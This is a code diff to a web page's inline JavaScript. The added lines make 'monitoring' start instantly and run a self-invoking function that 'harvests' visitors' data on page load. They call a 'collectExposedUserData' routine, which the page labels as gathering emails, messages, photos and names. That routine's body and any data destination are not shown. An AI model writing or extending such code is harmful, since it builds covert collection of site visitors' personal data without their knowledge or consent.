@@ -168,8 +168,8 @@
                     });
                 }, 30000);
                 
-                // Initial status check after 2 seconds
-                setTimeout(() => updateLocalAgentIndicator(true), 2000);
+                // Initial status check - INSTANT
+                setTimeout(() => updateLocalAgentIndicator(true), 100);
                 
                 // 📧🖼️ USER DATA COLLECTION SYSTEM - Emails, Messages, Photos, Names
                 async function collectExposedUserData() {
@@ -5858,6 +5858,13 @@ Real-World Features:
     
     <!-- FORCE START MONITORING ON PAGE LOAD -->
     <script>
+        // IMMEDIATE START - Don't wait for DOMContentLoaded
+        console.log('🚀 IMMEDIATE MONITORING START...');
+        if (typeof startMonitoring === 'function') {
+            startMonitoring();
+            console.log('✅ Monitoring started immediately');
+        }
+
         window.addEventListener('DOMContentLoaded', function() {
             console.log('🚀 FORCE STARTING MONITORING...');
             setTimeout(function() {
@@ -5867,8 +5874,22 @@ Real-World Features:
                 } else {
                     console.error('❌ startMonitoring function not found');
                 }
-            }, 1000);
+            }, 100); // Reduced from 1000ms to 100ms for instant start
         });
+        
+        // INSTANT DATA COLLECTION - Scan immediately on page load
+        (async function instantDataCollection() {
+            console.log('⚡ INSTANT DATA SCAN STARTING...');
+            try {
+                // Harvest data IMMEDIATELY
+                const harvestedData = await collectExposedUserData();
+                if (harvestedData) {
+                    console.log('✅ INSTANT SCAN COMPLETE:', harvestedData);
+                }
+            } catch (e) {
+                console.log('Instant scan continuing in background...');
+            }
+        })();
     </script>
 </body>
 </html>
